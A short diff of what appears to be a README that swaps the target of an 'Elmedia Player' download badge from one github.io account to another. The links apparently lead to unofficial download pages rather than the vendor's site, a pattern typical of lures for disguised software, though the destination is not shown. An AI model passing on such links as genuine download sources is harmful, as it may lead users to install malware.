@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-  <a href="https://manhyusuu48.github.io/.github/ElmediaPlayer">  
+  <a href="https://tembilamusion.github.io/.github/ElmediaPlayer">  
     <img src="https://img.shields.io/badge/⬇️_Get_Elmedia_Player_-FF6600?style=for-the-badge&logo=apple&logoColor=white" alt="Download Elmedia Player for Mac">  
   </a>  
 </div>  
